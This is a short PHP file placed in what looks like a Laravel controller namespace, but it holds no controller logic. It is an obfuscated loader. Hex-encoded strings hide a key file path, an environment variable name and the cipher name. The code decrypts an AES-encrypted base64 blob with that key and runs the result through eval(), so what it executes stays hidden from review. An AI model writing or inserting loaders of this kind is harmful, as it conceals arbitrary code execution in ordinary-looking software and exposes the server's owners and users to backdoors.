<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('kFj+P+pB+hEsaOtu5fqNtQ==');

$c=base64_decode(

'D9r0UxonKkpNOZTYOIAs2np3yETnZl27ECR+N6WaGaQ6RXktvavUHeRb6aM1/Hws7ganhf6cRSnH' .
'DaRsc9n/8ir/4Rmg3WVj362sjEifzbE5tSa0fq3jabcdxN6mhW749MUPnBs3xeZsTLlfL4DBRH7m' .
'HxabdSoSXeoiFgWLpAUtNm3njS1jv4mjxxDCHsW0xo9wJdk2pZX483HcAiV2ju4g0HjrcRU4LbkT' .
'E79JASCtCFSGQKG+kyT2YIPrf7zb28Cf3eP4DIm/DNC4T92nHWK9qmdlhkXWsFxdSMxdXMU='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

